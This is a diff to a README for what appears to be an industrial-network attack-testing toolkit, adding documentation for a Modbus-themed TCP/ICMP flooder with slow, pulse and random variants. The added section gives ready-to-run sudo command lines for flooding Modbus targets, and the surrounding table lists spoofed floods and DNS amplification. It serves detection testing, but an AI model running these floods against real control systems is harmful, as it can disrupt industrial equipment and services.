@@ -13,6 +13,7 @@
 | [replay.py](src/Injection/replay.py) | Impersonation | ModBus frequency replay attack | 2025-03-21 | [README](#modbus-replay-attack) |
 | [dos_icmp.py](src/flooding/dos_icmp.py) | Flooding | ICMP flood with IP spoofing and Rate Limiting| 2025-03-28 |  [README](#icmp-flood-attack) |
 | [dos_tcp.py](src/flooding/dos_tcp.py) | Flooding | TCP flood with IP spoofing and Rate Limiting | 2025-03-28 | [README](#tcp-flood-attack) |
+| [dos_temporal_variants.py](src/flooding/dos_temporal_variants.py) | Flooding | Temporal Modbus-themed TCP/ICMP flood variants | 2025-06-10 | [README](#temporal-dos-variants) |
 | [dns_ampification.py](src/flooding/dns_ampification.py) | Flooding | DNS Ampification attack | 2025-03-28 | To-Update |
 | [tcp_flag_injection.py](src/Injection/tcp_flag_injection.py) | Injection | TCP flag injection for non‑standard combinations | 2025-04-21 | [README](#tcp-flag-injection) |
 
@@ -375,6 +376,76 @@ Raw(load=os.urandom(PAYLOAD_SIZE))
   - Devices lacking SYN flood protection
   - Load balancers without rate limiting
   - Simulating botnet-like behavior from a single host
+
+## Temporal DoS Variants
+
+A CLI-configurable flooder that models slow, pulse, and random Modbus-like traffic over TCP or ICMP. Use it to validate detection of low-and-slow or time-gated bursts while keeping every control exposed through the command line.
+
+### Key Features
+
+- Multi-threaded workers per variant with coordinated shutdown handling
+- Modbus-inspired payload synthesis with configurable function codes and unit IDs
+- Supports long-lived TCP sessions and ICMP echo floods with jittered pacing
+- Tunable burst windows, silence gaps, inter-request ranges, packet-rate caps, and total runtime
+- Deterministic runs via optional random seed and explicit interface selection
+
+### CLI Usage
+
+```bash
+sudo python3 src/flooding/dos_temporal_variants.py \
+  --target 192.168.1.50 \
+  --protocol tcp \
+  --variant slow \
+  --workers 6 \
+  --min-irt 5 \
+  --max-irt 15 \
+  --payload-size 512
+```
+
+`--protocol` accepts `tcp` or `icmp`, and `--variant` must be one of `slow`, `pulse`, or `random`.
+
+### Variant Profiles
+
+- **slow**: Maintains long-lived sessions and waits between `min-irt` and `max-irt` seconds to imitate an idle but persistent client.
+- **pulse**: Sends `burst-packets` inside `burst-window` seconds, then idles for `silence` seconds to mimic time-gated spikes.
+- **random**: Randomizes Modbus headers (TCP) or payload entropy (ICMP) while pacing toward `pps` packets per second (`0` = unlimited).
+
+### Notable CLI Options
+
+| Option | Default | Notes |
+|--------|---------|-------|
+| `--port` | 502 | Destination TCP port (ignored for ICMP). |
+| `--unit-range` | `0:247` | Modbus unit ID bounds applied to synthesized headers. |
+| `--function-codes` | `1,2,3,4,5,6,15,16,43` | Comma-separated list of Modbus function codes. |
+| `--duration` | `0` | Total runtime in seconds (0 = run until interrupted). |
+| `--seed` | `None` | Seed for deterministic worker randomness. |
+| `--iface` | `scapy.conf.iface` | Override the sending interface if required. |
+
+### Additional Examples
+
+```bash
+# Burst 1000 ICMP packets every 100 ms, then stay quiet for 30 s
+sudo python3 src/flooding/dos_temporal_variants.py \
+  --target 10.10.20.23 \
+  --protocol icmp \
+  --variant pulse \
+  --burst-packets 1000 \
+  --burst-window 0.1 \
+  --silence 30 \
+  --workers 4
+```
+
+```bash
+# High-entropy Modbus TCP flood capped at 500 pps for 2 minutes
+sudo python3 src/flooding/dos_temporal_variants.py \
+  --target 10.10.20.23 \
+  --protocol tcp \
+  --variant random \
+  --pps 500 \
+  --duration 120 \
+  --function-codes 43,14,8,11 \
+  --unit-range 64:127
+```
 
 ****
 
